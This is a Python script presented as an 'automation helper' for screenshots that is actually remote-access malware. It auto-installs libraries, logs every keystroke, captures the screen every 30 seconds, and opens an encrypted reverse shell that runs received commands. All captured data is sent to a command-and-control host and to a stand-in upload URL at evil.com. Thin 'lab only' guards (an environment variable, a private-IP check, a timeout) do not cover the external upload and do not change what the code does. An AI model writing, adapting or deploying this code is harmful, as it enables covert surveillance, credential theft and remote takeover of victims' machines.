"""Generated automation helper script for screenshots and payload work."""

import os,sys,subprocess,threading,socket,time,base64,json,struct,random,string,platform
from datetime import datetime

C2_IP="192.168.1.100"
C2_PORT=4444
ENCRYPT_KEY=b"LABONLYKEY123456"
UPLOAD_URL="http://evil.com/upload"

def inst(p):
    try:
        __import__(p)
    except:
        subprocess.call([sys.executable,"-m","pip","install","--user",p])

for m in ["pynput","PIL","mss","pycryptodome","requests","websocket"]:
    inst(m)

def chk_env():
    if os.environ.get("PENTEST_LAB")!="1":
        sys.exit(1)

def chk_host(ip):
    a=[int(x) for x in ip.split(".")]
    if len(a)!=4: return False
    if a[0]==10: return True
    if a[0]==192 and a[1]==168: return True
    return False

if not chk_host(C2_IP):
    sys.exit(1)
chk_env()

START=time.time()
def timeout():
    while True:
        if time.time()-START>300:
            sys.exit(0)
threading.Thread(target=timeout,daemon=True).start()

def no_persist():
    if platform.system()=="Windows":
        try:
            import winreg
            for k in [winreg.HKEY_CURRENT_USER,winreg.HKEY_LOCAL_MACHINE]:
                try:
                    key=winreg.OpenKey(k,r"Software\Microsoft\Windows\CurrentVersion\Run")
                    if key: sys.exit(1)
                except: pass
        except: pass
    else:
        if os.path.exists(os.path.expanduser("~/.bashrc")) or os.path.exists(os.path.expanduser("~/.crontab")):
            sys.exit(1)
no_persist()

class Cry:
    def __init__(self):
        try:
            from Crypto.Cipher import AES
            self.aes=True
        except:
            self.aes=False
    def enc(self,d):
        d=b"LAB-TEST"+d
        if self.aes:
            from Crypto.Cipher import AES
            pad=lambda s:s+(16-len(s)%16)*b" "
            c=AES.new(ENCRYPT_KEY,AES.MODE_ECB)
            return c.encrypt(pad(d))
        else:
            k=ENCRYPT_KEY
            return bytes([d[i]^k[i%len(k)] for i in range(len(d))])
    def dec(self,d):
        if self.aes:
            from Crypto.Cipher import AES
            c=AES.new(ENCRYPT_KEY,AES.MODE_ECB)
            return c.decrypt(d)
        else:
            k=ENCRYPT_KEY
            return bytes([d[i]^k[i%len(k)] for i in range(len(d))])
cry=Cry()

def http_post(data):
    try:
        import requests
        requests.post(UPLOAD_URL,data=data,timeout=10)
    except:
        try:
            import urllib.request
            urllib.request.urlopen(UPLOAD_URL,data=data,timeout=10)
        except: pass

def ws_send(data):
    try:
        import websocket
        ws=websocket.create_connection("ws://%s:%d"%(C2_IP,C2_PORT))
        ws.send(data)
        ws.close()
    except: pass

def exfil(data):
    e=cry.enc(data)
    http_post(e)
    ws_send(e)

def keylog():
    try:
        from pynput.keyboard import Listener
        def on(k):
            try:
                s=str(k.char)
            except:
                s=str(k)
            exfil(s.encode())
        with Listener(on_press=on) as l: l.join()
    except:
        try:
            if platform.system()=="Windows":
                import msvcrt
                while True:
                    if msvcrt.kbhit():
                        exfil(msvcrt.getch())
            else:
                import termios,tty
                fd=sys.stdin.fileno()
                old=termios.tcgetattr(fd)
                tty.setraw(fd)
                while True:
                    exfil(os.read(fd,1))
        except: pass

def screen():
    while True:
        try:
            from mss import mss
            from PIL import Image
            with mss() as s:
                m=s.grab(s.monitors[1])
                im=Image.frombytes("RGB",m.size,m.rgb)
                im.thumbnail((800,600))
                b=io.BytesIO()
                im.save(b,"JPEG",quality=50)
                exfil(base64.b64encode(b.getvalue()))
        except:
            try:
                from PIL import ImageGrab
                im=ImageGrab.grab()
                im.thumbnail((800,600))
                b=io.BytesIO()
                im.save(b,"JPEG",quality=50)
                exfil(base64.b64encode(b.getvalue()))
            except: pass
        time.sleep(30)

def revshell():
    while True:
        try:
            s=socket.socket()
            s.connect((C2_IP,C2_PORT))
            while True:
                d=cry.dec(s.recv(4096))
                if d.startswith(b"LAB-TEST"):
                    o=subprocess.run(d[8:],shell=True,capture_output=True)
                    s.send(cry.enc(o.stdout+o.stderr))
            s.close()
        except:
            time.sleep(10)

def heartbeat():
    while True:
        exfil(b"HB:%f"%time.time())
        time.sleep(15)

import io
threading.Thread(target=keylog,daemon=True).start()
threading.Thread(target=screen,daemon=True).start()
threading.Thread(target=revshell,daemon=True).start()
threading.Thread(target=heartbeat,daemon=True).start()
while True:
    time.sleep(1)